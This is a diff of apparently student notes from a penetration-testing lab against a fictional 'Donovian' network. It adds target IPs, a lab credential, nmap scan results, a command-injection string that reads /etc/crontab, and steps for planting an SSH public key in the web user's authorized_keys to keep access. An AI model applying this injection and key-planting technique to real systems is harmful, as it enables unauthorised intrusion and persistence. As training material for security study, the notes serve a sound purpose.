@@ -919,26 +919,6 @@ PSP: none
 Malware: none
 Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
 
-T2
-Hostname: Donovian_Intranet
-IP: ???
-OS: ???
-Creds:Unknown
-Last Known SSH Port: ???
-PSP: none
-Malware: none
-Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
-
-T3
-Hostname: unknown
-IP: x.x.x.9
-OS: unknown
-Creds:unknown
-Last Known SSH Port: unknown
-PSP: Unknown
-Malware: Unknown
-Action: Gain access; survey host and map Donovian internal Cyberspace.
-
 80/tcp   open  http
 | http-enum: 
 |   /admin/: Possible admin folder
@@ -947,6 +927,46 @@ Action: Gain access; survey host and map Donovian internal Cyberspace.
 |   /admin/login.php: Possible admin folder
 |_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
 2222/tcp open  EtherNetIP-1
+
+T2
+Hostname: Donovian_Intranet
+IP: 192.168.150.253
+OS: ???
+Creds: comrade::StudentMidwayPassword
+Last Known SSH Port: ???
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
+
+80/tcp   open  http
+514/tcp  open  shell
+3201/tcp open  cpq-tasksmart
+
+T3
+Hostname: unknown
+IP: 192.168.28.9
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Gain access; survey host and map Donovian internal Cyberspace.
+
+22/tcp  open  ssh
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+5040/tcp  open  unknown
+5985/tcp  open  wsman
+5986/tcp  open  wsmans
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49671/tcp open  unknown
 
 
 Extranet
@@ -978,6 +998,17 @@ Question 1:
 			ff02::2 ip6-allrouters
 			ff02::3 ip6-allhosts
 			192.168.150.253 Donovian-Intranet
+		; cat /etc/crontab
+			*  *    * * *   root    tar -C /home/comrade/ -czf /tmp/backup.tar.gz .ssh/
+		@lin-ops $ ssh-keygen -t rsa -b 4096
+
+	back to webpage
+		mkdir /var/www/.ssh
+		touch /var/www/.ssh/authorized_keys
+		echo "<public_key_string>" >> <home directory>/.ssh/authorized_keys
+
+		@lin-ops $ ssh www-data@localhost -p 62001
+
 
 Question 2:
 	
@@ -1012,7 +1043,7 @@ Question 11:
 	
 
 Question 12:
-	
+	@@badguy:514
 
 Internal
 
